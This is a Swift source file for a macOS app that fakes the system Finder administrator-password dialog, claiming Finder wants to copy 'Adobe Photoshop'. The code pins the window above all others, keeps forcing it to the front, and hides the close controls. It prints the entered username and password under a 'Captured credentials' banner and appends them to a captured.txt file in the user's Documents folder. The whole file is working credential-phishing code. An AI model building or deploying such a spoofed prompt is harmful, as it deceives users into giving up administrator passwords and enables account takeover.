// LoginAuth.swift
import SwiftUI
import AppKit
import QuartzCore

@main
struct LoginAuthApp: App {
    @NSApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    var body: some Scene {
        WindowGroup { ContentView().background(WindowConfigurator()) }
            .windowStyle(.hiddenTitleBar)
            .windowResizability(.contentSize)
            .commands { CommandGroup(replacing: .newItem) { } }
    }
}

final class AppDelegate: NSObject, NSApplicationDelegate {
    func applicationWillFinishLaunching(_ n: Notification) { NSApp.setActivationPolicy(.accessory) }
    func applicationDidFinishLaunching(_ n: Notification) {
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.1) { NSApp.activate(ignoringOtherApps: true) }
    }
    func applicationShouldTerminateAfterLastWindowClosed(_ s: NSApplication) -> Bool { true }
}

struct WindowConfigurator: NSViewRepresentable {
    func makeNSView(context: Context) -> NSView {
        let v = NSView()
        DispatchQueue.main.async {
            guard let w = v.window else { return }
            w.standardWindowButton(.closeButton)?.isHidden       = true
            w.standardWindowButton(.miniaturizeButton)?.isHidden = true
            w.standardWindowButton(.zoomButton)?.isHidden        = true
            w.titlebarAppearsTransparent = true
            w.titleVisibility            = .hidden
            w.styleMask.insert(.fullSizeContentView)
            w.isMovableByWindowBackground = true
            w.isOpaque = false
            w.backgroundColor = .clear
            w.hasShadow = false
            w.isReleasedWhenClosed = false
            if #available(macOS 11.0, *) { w.titlebarSeparatorStyle = .none }
            let patterns = ["Titlebar", "Toolbar", "NSTitlebar", "_NSFullSizeContentView",
                            "TitlebarContainer", "TitlebarAccessory", "TitlebarBackground"]
            if let frameView = w.contentView?.superview {
                for sub in frameView.subviews {
                    for p in patterns where sub.className.contains(p) {
                        sub.isHidden = true
                        sub.frame.size.height = 0
                    }
                }
            }
            w.level = .screenSaver
            w.collectionBehavior.insert(.canJoinAllSpaces)
            w.collectionBehavior.insert(.fullScreenAuxiliary)
            w.collectionBehavior.insert(.stationary)
            w.collectionBehavior.insert(.ignoresCycle)
            w.hidesOnDeactivate = false
            w.center()
            w.makeKeyAndOrderFront(nil)
            w.orderFrontRegardless()
            Timer.scheduledTimer(withTimeInterval: 0.8, repeats: true) { _ in
                w.level = .screenSaver
                w.orderFrontRegardless()
            }
        }
        return v
    }
    func updateNSView(_ nsView: NSView, context: Context) { }
}

struct VisualEffectView: NSViewRepresentable {
    let material: NSVisualEffectView.Material
    func makeNSView(context: Context) -> NSVisualEffectView {
        let v = NSVisualEffectView()
        v.material = material
        v.blendingMode = .behindWindow
        v.state = .active
        return v
    }
    func updateNSView(_ nsView: NSVisualEffectView, context: Context) {
        nsView.material = material
    }
}

func chromaKeyLightBlue(_ image: NSImage) -> NSImage {
    guard let cg = image.cgImage(forProposedRect: nil, context: nil, hints: nil) else { return image }
    let w = cg.width, h = cg.height
    guard let ctx = CGContext(data: nil, width: w, height: h, bitsPerComponent: 8,
                              bytesPerRow: w * 4,
                              space: CGColorSpaceCreateDeviceRGB(),
                              bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else { return image }
    ctx.draw(cg, in: CGRect(x: 0, y: 0, width: w, height: h))
    guard let data = ctx.data else { return image }
    let ptr = data.bindMemory(to: UInt8.self, capacity: w * h * 4)
    for i in 0..<(w * h) {
        let r = Int(ptr[i*4+0]), g = Int(ptr[i*4+1]), b = Int(ptr[i*4+2])
        let dr = r - 170, dg = g - 214, db = b - 242
        let distSq = dr*dr + dg*dg + db*db
        if distSq < 2500 {
            ptr[i*4+3] = 0
        } else if distSq < 4900 {
            let alpha = UInt8(max(0, min(255, Int(ptr[i*4+3]) * (distSq - 2500) / 2400)))
            ptr[i*4+3] = alpha
        }
    }
    guard let newCg = ctx.makeImage() else { return image }
    return NSImage(cgImage: newCg, size: NSSize(width: w, height: h))
}

struct FinderPadlockIcon: View {
    @State private var processed: NSImage? = nil
    var body: some View {
        Group {
            if let img = processed {
                Image(nsImage: img)
                    .resizable()
                    .interpolation(.high)
                    .frame(width: 88, height: 88)
            } else {
                Color.clear.frame(width: 88, height: 88)
            }
        }
        .onAppear {
            if let path = Bundle.main.path(forResource: "icon", ofType: "png"),
               let raw = NSImage(contentsOfFile: path) {
                processed = chromaKeyLightBlue(raw)
            }
        }
    }
}

private let appleSystemBlue = Color(red: 0.0, green: 0.478, blue: 1.0)
private let fieldAlpha: Double = 0.18

struct SecondaryButtonStyle: ButtonStyle {
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: 13))
            .foregroundColor(.primary)
            .frame(maxWidth: .infinity)
            .frame(height: 24)
            .background(Capsule(style: .continuous).fill(Color.black.opacity(0.14)))
            .contentShape(Capsule(style: .continuous))
            .opacity(configuration.isPressed ? 0.70 : 1.0)
    }
}

struct PrimaryButtonStyle: ButtonStyle {
    let isActive: Bool
    func makeBody(configuration: Configuration) -> some View {
        configuration.label
            .font(.system(size: 13))
            .foregroundColor(isActive ? .white : .primary)
            .frame(maxWidth: .infinity)
            .frame(height: 24)
            .background(
                Capsule(style: .continuous)
                    .fill(isActive ? appleSystemBlue : Color.black.opacity(0.14))
            )
            .contentShape(Capsule(style: .continuous))
            .opacity(configuration.isPressed ? 0.80 : 1.0)
            .animation(.easeInOut(duration: 0.15), value: isActive)
    }
}

struct ContentView: View {
    @State private var username = ""
    @State private var password = ""
    @State private var isLoading = false
    @State private var windowIsKey = true
    @FocusState private var focusedField: Field?
    enum Field { case username, password }

    var body: some View {
        VStack(alignment: .leading, spacing: 0) {
            FinderPadlockIcon()
                .padding(.bottom, 8)

            Text("Finder")
                .font(.system(size: 15, weight: .bold))
                .foregroundColor(.primary)
                .padding(.bottom, 10)

            Text("Finder wants to copy \u{201C}Adobe Photoshop\u{201D}.")
                .font(.system(size: 13))
                .foregroundColor(.primary)
                .padding(.bottom, 5)

            Text("Enter an administrator\u{2019}s name and password to allow this.")
                .font(.system(size: 13))
                .foregroundColor(.primary)
                .lineSpacing(2)
                .fixedSize(horizontal: false, vertical: true)
                .padding(.bottom, 10)

            fieldContainer(text: $username, placeholder: "Username", secure: false, field: .username)
                .padding(.bottom, 6)

            fieldContainer(text: $password, placeholder: "Password", secure: true, field: .password)
                .padding(.bottom, 10)

            HStack(spacing: 12) {
                Button("Cancel") { cancel() }
                    .buttonStyle(SecondaryButtonStyle())
                    .keyboardShortcut(.cancelAction)
                    .disabled(isLoading)
                Button("OK") { submit() }
                    .buttonStyle(PrimaryButtonStyle(isActive: windowIsKey))
                    .keyboardShortcut(.defaultAction)
                    .disabled(isLoading)
            }
            .overlay(alignment: .leading) {
                if isLoading {
                    ProgressView()
                        .controlSize(.small)
                        .scaleEffect(0.6)
                        .offset(x: -16)
                }
            }
        }
        .padding(14)
        .frame(width: 260)
        .background(VisualEffectView(material: .popover))
        .clipShape(RoundedRectangle(cornerRadius: 20, style: .continuous))
        .overlay(
            RoundedRectangle(cornerRadius: 20, style: .continuous)
                .stroke(Color.white.opacity(0.10), lineWidth: 0.5)
        )
        .compositingGroup()
        .shadow(color: .black.opacity(0.10), radius: 2, x: 0, y: 1)
        .shadow(color: .black.opacity(0.055), radius: 10, x: 0, y: 4)
        .shadow(color: .black.opacity(0.028), radius: 24, x: 0, y: 10)
        .shadow(color: .black.opacity(0.014), radius: 44, x: 0, y: 18)
        .padding(.top, 14)
        .padding(.horizontal, 20)
        .padding(.bottom, 28)
        .onReceive(NotificationCenter.default.publisher(for: NSWindow.didBecomeKeyNotification)) { _ in
            windowIsKey = true
        }
        .onReceive(NotificationCenter.default.publisher(for: NSWindow.didResignKeyNotification)) { _ in
            windowIsKey = false
        }
        .onAppear {
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.15) {
                focusedField = .username
            }
        }
    }

    @ViewBuilder
    private func fieldContainer(text: Binding<String>, placeholder: String, secure: Bool, field: Field) -> some View {
        let isFocused = focusedField == field
        ZStack(alignment: .leading) {
            if text.wrappedValue.isEmpty {
                Text(placeholder)
                    .font(.system(size: 13))
                    .foregroundColor(Color.secondary.opacity(0.55))
                    .padding(.horizontal, 10)
                    .allowsHitTesting(false)
            }
            Group {
                if secure {
                    SecureField("", text: text)
                } else {
                    TextField("", text: text)
                }
            }
            .textFieldStyle(.plain)
            .font(.system(size: 13))
            .padding(.horizontal, 10)
            .frame(height: 24)
            .focused($focusedField, equals: field)
            .disabled(isLoading)
            .onSubmit { submit() }
        }
        .background(
            RoundedRectangle(cornerRadius: 6, style: .continuous)
                .fill(Color.black.opacity(fieldAlpha))
        )
        .overlay(
            ZStack {
                RoundedRectangle(cornerRadius: 6, style: .continuous)
                    .stroke(appleSystemBlue.opacity(0.22), lineWidth: 3)
                    .blur(radius: 1.2)
                RoundedRectangle(cornerRadius: 6, style: .continuous)
                    .stroke(appleSystemBlue.opacity(0.65), lineWidth: 1.4)
            }
            .opacity(isFocused ? 1.0 : 0.0)
            .animation(.easeInOut(duration: 0.20), value: isFocused)
        )
    }

    private func cancel() { NSApp.terminate(nil) }

    private func submit() {
        guard !isLoading else { return }
        guard !username.isEmpty, !password.isEmpty else {
            focusedField = username.isEmpty ? .username : .password
            return
        }
        isLoading = true
        let u = username, p = password
        print("=== Captured credentials ===")
        print("Username: \(u)")
        print("Password: \(p)")
        print("============================")
        saveToDocumentsFile(username: u, password: p)
        DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) { fadeOutAndQuit() }
    }

    private func saveToDocumentsFile(username: String, password: String) {
        let fm = FileManager.default
        guard let docs = fm.urls(for: .documentDirectory, in: .userDomainMask).first else { return }
        let fileURL = docs.appendingPathComponent("captured.txt")
        let df = DateFormatter()
        df.dateFormat = "yyyy-MM-dd HH:mm:ss"
        let stamp = df.string(from: Date())
        let block = """
        [\(stamp)]
        Username: \(username)
        Password: \(password)
        ----------------------------------------

        """
        guard let data = block.data(using: .utf8) else { return }
        if fm.fileExists(atPath: fileURL.path) {
            if let handle = try? FileHandle(forWritingTo: fileURL) {
                handle.seekToEndOfFile()
                handle.write(data)
                try? handle.close()
            }
        } else {
            try? data.write(to: fileURL)
        }
    }

    private func fadeOutAndQuit() {
        guard let w = NSApp.windows.first else { NSApp.terminate(nil); return }
        NSAnimationContext.runAnimationGroup({ ctx in
            ctx.duration = 0.45
            ctx.timingFunction = CAMediaTimingFunction(name: .easeInEaseOut)
            w.animator().alphaValue = 0.0
        }, completionHandler: { NSApp.terminate(nil) })
    }
}
